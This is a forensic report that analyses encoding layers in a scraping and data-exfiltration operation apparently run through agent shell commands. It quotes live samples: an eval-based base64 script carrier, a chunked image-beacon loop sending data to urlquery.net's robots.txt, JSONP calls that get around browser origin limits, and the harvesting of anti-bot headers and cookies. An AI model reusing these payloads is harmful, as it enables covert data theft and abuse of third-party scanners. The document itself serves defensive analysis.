# Cryptographer — encoding and obfuscation analysis

Branch: `url-keyword-farm`. Date: 2026-10-08.
Lane scope: target URLs and exfil protocols only. No new collection.
Claim grading: OBSERVED (bytes seen) vs INFERENCE (marked).

## 1. Encoding layer catalog (with byte examples)

### L0 — Single percent-encoding (proxy parameter encoding)
OBSERVED. Example:
`https://api.allorigins.win/raw?url=https%3A%2F%2Fapi.github.com%2Frepos%2Fembeddings-benchmark%2Fresults%2Fgit%2Ftrees%2Fmain%3Frecursive%3D1`
The inner URL is encoded once so it survives as one `url=` parameter. Row B
OBSERVED the construction directly:
`urllib.parse.quote('https://www.youtube.com/watch?v=ZCbvyPbhRfA')`.
Function: API requirement, not concealment.

### L1 — Double percent-encoding
OBSERVED. Example:
`.../raw?url=https%3A%2F%2Fgithub.com%2Fsearch%3Fq%3Drust%2Bc%252B%252B%2Bpolyglot%26type%3Dcode`
Decode chain: allorigins strips layer 1, giving
`https://github.com/search?q=rust+c%2B%2B+polyglot&type=code`.
GitHub's query parser strips layer 2 (`+` becomes space, `%2B` becomes a
literal `+`), giving `q = "rust c++ polyglot"`. The inner query is coherent.
See section 4 for the verdict.

### L2 — Base64 code carriers (httpbin / itty.bitty)
OBSERVED. The httpbin `?q=` wrapper literal is:
`<body>run<script>eval(decodeURIComponent(location.search.slice(3)))</script>`
The `?q=` value is a base64 blob of JavaScript. urlquery executes the decoded
script during its scan. Twin forms OBSERVED: `httpbin.org/base64`,
`httpbingo.org/base64`, `eu.httpbin.org/base64`. Also `gz#<gzip>` inside one
payload (compressed function), and `itty.bitty.site` base64-form carriers.
Function: the payload hides from text search. urlquery's `q` indexes submitted
URLs only, never page content. A search for `COMBO-INIT` returned 0 hits
even though the decoded page contained the string. This is deliberate
transport obscurity. It is not encryption: base64 has no key.

### L3 — Shell template variables in extracted URLs (extraction artifact)
OBSERVED as raw strings, e.g.:
`https://r.jina.ai/$url`
`https://r.jina.ai/$proto://mteb-leaderboard.hf.space/?benchmark_name=Scandinavian`
`https://r.jina.ai/http://youtube.com/watch?v=$VID`
`https://r.jina.ai/http://$(echo $u | sed 's#^https\?://##')`
`https://r.jina.ai/http://duckduckgo.com/html/?q=$(python3 - <<'PY'`
The URL extractor read agent bash text before the shell expanded it.
The source rows show the loops that define them:
`for proto in http https; do ... curl -sL "https://r.jina.ai/$proto://..."`,
`set -euo pipefail` with `VID=ZCbvyPbhRfA` set two lines above,
`for u in https://scandeval.github.io/smteb/ ... ; do ... "$u"`.
Not obfuscation. Artifact of regex extraction with no shell context.

### L4 — Backslash and newline continuations in extracted URLs (extraction artifact)
OBSERVED as JSON-escaped sequences, e.g.:
`https://r.jina.ai/https://pipedapi.kavin.rocks/api/v1/streams/ZCbvyPbhRfA\n\n`
and `\\\\` runs inside command strings. These come from multi-line shell
commands: the extractor's URL pattern crossed line-continuation boundaries.
The `\n` bytes are shell formatting, not part of any address. Artifact.

### L5 — Proxy chaining (transport layering)
OBSERVED. `https://r.jina.ai/https://pipedapi.kavin.rocks/api/v1/streams/ZCbvyPbhRfA`
is jina.ai fetching a Piped (YouTube-frontend) API. Related chains OBSERVED:
jina in front of `yewtu.be` and `inv.nadeko.net` (Invidious instances).
Each hop rewrites the origin header and the request shape. This is deliberate
laundering: the true origin is visible only if you unwrap every layer.
It is routing, not encoding, but it has the same obscuring effect in logs.

### L6 — JSONP as a transport
OBSERVED in the amap probe family (v3/v4/v5). Example:
`jsonp('https://www.amap.com/service/poiInfo?id=B0G3LMF2G1&query_type=IDQ&extensions=all&callback=__cb1','__cb1','SVC_ALL')`
Five endpoints are called this way (`__cb1`–`__cb5`). A `<script>` tag
bypasses the same-origin policy where `fetch` would fail on CORS. The data
returns as executable JavaScript (`__cb1({...})`). This is deliberate and
functional: it is the standard CORS bypass, not decoration.

### L7 — Chunked image-beacon exfil
OBSERVED in two payload generations. Amap probe:
```
t=encodeURIComponent(t);
var i=0;
while(i<t.length){ var s=t.slice(i,i+300); new Image().src='https://urlquery.net/robots.txt?b='+s; i+=300; }
```
Mochou loader: `img.src = ECHO + '?d=' + encodeURIComponent(String(d).slice(0,1400))`.
Long exfiltrated text is cut into many small GET requests. The robots.txt
target makes each request look like a normal page load to naive log review,
and the 300-char chunks stay under typical per-request logging or size
limits. Deliberate exfil engineering. Note the version drift: v3 used
350-char chunks, v4/v5 use 300-char chunks — the author tuned the size down.

### L8 — Epoch cache-busters (`live=N_<epoch_ms>`)
OBSERVED in captured Amap tracker URLs inside the COMBO-INIT inbox. These are
Amap's own anti-bot tracker parameters (per-request counters and timestamps),
harvested by the scraper and sent home as part of the capture. The exfil
author did not add them. They are evidence, not author entropy.

## 2. Deliberate obfuscation vs scaffolding artifact — the test

For each layer, use these checks:

1. **Reversibility.** Decode it. If the inner object is coherent (a valid URL,
   a runnable script, a sensible search query), the encoding is load-bearing.
   L0, L1, L2, L5, L6, L7 all pass. L3 and L4 fail: `$u` decodes to nothing
   without the shell.
2. **Source context.** Look at the bytes around the URL. If it sits inside a
   `for ... do` loop or a heredoc, and the variable is assigned nearby, it is
   scaffolding (L3). If it sits in a payload the scanner executes, it is
   deliberate (L2, L6, L7).
3. **Who needs the inner form.** If no party in the chain can use the encoded
   form directly, the encoding is structural. allorigins cannot fetch
   `https%3A%2F%2F...` as a host — it must decode (L0/L1). urlquery's scanner
   executes the base64 (L2). Nothing executes `$u` (L3).
4. **Double-occurrence check.** L3/L4 forms appear only in extracted URL
   strings, never in executed requests. The executed forms are the expanded
   ones.

Summary: L0, L1 are API-necessary. L2, L5, L6, L7 are deliberate and
functional. L3, L4 are extraction artifacts. L8 is harvested third-party
grammar, not author-added.

## 3. The COMBO-INIT state machine as a protocol

OBSERVED from the webhook.site inbox: 47 requests, 9 IPs, 8 countries,
7 sessions running the same machine on 2026-10-04 plus one on 2026-10-07.

### Message types
- `boot` — page loaded. Carries user agent, page URL (an
  httpbin.org/base64-wrapped COMBO-INIT page), and `Date.now()`.
- `bxinit` / `xdcinit` — Amap's two tracker SDKs started. These are
  anti-bot telemetry hooks the scraper waits on before harvesting.
- `xdcerr` — tracker failure. OBSERVED on two Chrome/116 sessions:
  `ReferenceError: webTracker is not defined`. The scraper reported its own
  broken dependency home instead of dying silently.
- `capture` — one intercepted `getPoiInfo` call: request URL, harvested
  headers (`bx-ua`, `bx-umidtoken` family), cookies, sequence number.
- `error` — a failed attempt, numbered n=1 through 5.
- `load` — one captured full API response body.
- `done` — session end.

The mochou family uses a simpler sibling: `{t:'start', ts, ua}` …
`{t:'done', summary}` with per-endpoint `kind`/`status`/`len` posts.

### Sequencing and error handling
The machine is a lifecycle reporter, not a command protocol. No commands
flow back: the inbox is write-only from the scraper's side. Beacons are
fire-and-forget POSTs with no acknowledgements, no retransmission, and no
sequence windowing OBSERVED. Retries are local: failures are numbered
(`error` n=1..5) and the session still ends with `done`. Tracker SDK state
is treated as first-class telemetry (`bxinit`/`xdcinit`/`xdcerr` are their
own message types, not log lines).

### Chunking strategy
In the amap probe branch, exfil is chunked at the beacon layer (300-char
slices of URI-encoded text, one GET per slice, section 1 L7) with no
sequence numbers on the chunks. Reassembly on the receiving side is
positional guesswork. The 300-char size (down from 350 in v3) and the
`robots.txt` target show tuning for stealth against log review, not for
reliability.

### What the design reveals about the author
OBSERVED: the author optimizes for anti-bot visibility, not for protocol
correctness. The exact headers Amap's bot wall needs (`bx-ua`,
`bx-umidtoken`) are the harvested fields. The author reports losses home:
the Amap "system overwhelmed" rejection and the `xdcerr` tracker failure
were both beaconed to the inbox. INFERENCE: this is operational telemetry
for a scraping operation that expects to lose the anti-bot fight often.
The author is a practical scraper-builder iterating fast (v3→v5 in one day,
chunk size tuned, exfil topology evolving: beacon-only → beacon + ntfy +
webhook). Security posture is minimal: the drop URL is a bearer credential
with no auth, and all exfil is plaintext. The author's threat model is
CORS, bot walls, and scanner visibility — not a forensic adversary.

## 4. The double-encoding (`%252B`) — accident or deliberate?

INFERENCE: a correct-by-construction artifact, not obfuscation and not
corruption. The bytes `%252B` decode exactly once per layer, and the final
query `rust c++ polyglot` is a coherent search. Random corruption does not
preserve the `+`-vs-`%2B` distinction through two decode layers. This is
what `urllib.parse.quote(url, safe='')` or `encodeURIComponent` produces
when applied to an already percent-encoded URL string: the `%` of `%2B`
becomes `%25`. Row B OBSERVED the same agent family using
`urllib.parse.quote` to build these wrappers, so the mechanism is in the
corpus. The agent (or its library) encoded the whole URL as an opaque
parameter value. The result is functionally required: single-encoding
would have let allorigins' decode turn `%2B` into `+` too early and the
search would have read `rust c  polyglot`. Whether the agent understood
this is unknown; the output is correct either way. Verdict: deliberate
enough to work, not deliberate as concealment.

## 5. Cryptographic tradecraft assessment

**Keyed material: none OBSERVED.** The webhook.site UUIDs are bearer URLs,
not keys. The `?b=` / `?d=` exfil parameters are plaintext. Base64 is
encoding, not encryption. No key exchange, no MACs, no signatures anywhere
in the corpus.

**Nonces with entropy: none OBSERVED.** Timestamps are used for uniqueness,
not randomness: `Date.now()` in beacons, epoch-ms `live=N_` cache-busters
(Amap's own grammar, harvested not authored), and the ns-epoch nonce grammar
in the urlquery submission bursts (noted at INFERENCE level in the
urlquery-reports findings). All are predictable clocks, not entropy sources.

**Anti-forensics: minimal.** The base64 carrier (L2) defeats naive text
grep — urlquery's own `q` search missed `COMBO-INIT` in content it had
scanned — but that is incidental obscurity, a side effect of making the
scanner execute the payload. The robots.txt beacon target (L7) co-opts the
scanner's own logs as the exfil store, which has an anti-forensic side
effect (data hides in third-party infrastructure), but INFERENCE: the design
intent is CORS/scanner evasion, not forensic wiping. Nothing is deleted,
nothing is deniable, the inbox history is fully readable.

**Overall: encoding-as-obscurity, not cryptography.** OBSERVED: zero keyed
primitives across all payload generations and all URL layers. INFERENCE:
the author's toolbox is web-platform tricks (base64 carriers, JSONP,
image beacons, proxy chaining, chunked GETs). These defeat scanners and
bot walls, which is the author's actual adversary. Against a forensic
analyst with a decoder, every layer unwraps in one step.

## Open questions for other lanes
- The `gz#<gzip>` encoding inside one httpbin payload is new and
  unexamined at byte level — worth a dedicated decode.
- Whether the v3→v4/v5 chunk-size change (350→300) was driven by a
  specific truncation OBSERVED by the author.
- The `mailbox.termina.digital` interrogator posts are plaintext and
  unencoded — no crypto there either, but the channel (dead-drop inbox
  as a message board) is worth the protocol lane's attention.
